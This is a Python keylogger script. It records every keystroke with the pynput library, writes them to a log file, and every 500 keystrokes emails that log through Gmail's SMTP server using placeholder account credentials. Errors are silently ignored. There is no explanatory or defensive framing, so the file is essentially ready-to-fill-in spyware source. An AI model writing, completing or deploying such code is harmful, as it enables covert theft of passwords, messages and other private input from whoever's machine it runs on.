from pynput.keyboard import Key , Listener

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

import os

from pynput.keyboard import Key , Listener



import os

count = 0 

keys = []

aim = 0

def on_press(key):

    global count,keys,aim

    count += 1

    aim += 1

    keys.append(key)

    if count >= 1 : 

        count = 0

        write_file(keys)

        keys = []

    if aim == 500 : 

        aim = 0 

        send_files()

        keys = []

def send_files() :

    try :

        content =''

        mail = smtplib.SMTP('smtp.gmail.com',587)

        mail.ehlo()

        mail.starttls()

        mail.login('yourgmail','yourpassword')

        message = MIMEMultipart()

        message.attach(MIMEText (content  ,'plain'))

        attach_file = open('log.txt', 'rb')

        payload = MIMEBase('application','octate-stream')

        payload.set_payload((attach_file).read())
        
        encoders.encode_base64(payload)

        payload.add_header('Content-Decomposition', 'attachment', filename='log.txt')

        message.attach(payload)

        text  = message.as_string()
        
        mail.sendmail('sender','receiver',text)

        mail.quit()

    except :

        return

def write_file(keys) :

    with open('log.txt','a' , encoding = 'utf-8') as file :

        for key in keys :

            k = str(key).replace("'","")

            if k.find("space") > 0 :

                file.write(" ")

            elif k.find("Key.shift") == -1 :

                file.write(k)

with Listener (on_press = on_press) as listener:

    listener.join()